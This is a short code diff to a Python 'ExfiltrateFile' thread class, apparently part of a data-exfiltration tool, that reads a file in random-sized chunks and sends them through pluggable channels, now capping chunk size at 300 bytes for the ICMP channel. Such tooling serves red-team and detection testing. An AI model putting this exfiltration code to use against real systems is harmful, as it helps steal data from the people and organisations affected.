@@ -241,6 +241,7 @@ class ExfiltrateFile(threading.Thread):
         self.checksum = md5(file_to_send)
         self.daemon = True
 
+
     def run(self):
         # registering packet
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
@@ -267,7 +268,13 @@ class ExfiltrateFile(threading.Thread):
 
         packet_index = 0
         while (True):
-            randomint = randint(MIN_BYTES_READ, MAX_BYTES_READ)
+            randomint = 0
+            if plugin_name is not "icmp":
+                randomint = randint(MIN_BYTES_READ, MAX_BYTES_READ)
+                ok("Setting %s MAX_BYTES to %s"%(plugin_name,MAX_BYTES_READ))
+            else:
+                randomint = randint(MIN_BYTES_READ, 300)
+                ok("Setting %s MAX_BYTES to %s"%(plugin_name,300))
             data_file = f.read(randomint)
             if not data_file:
                 break
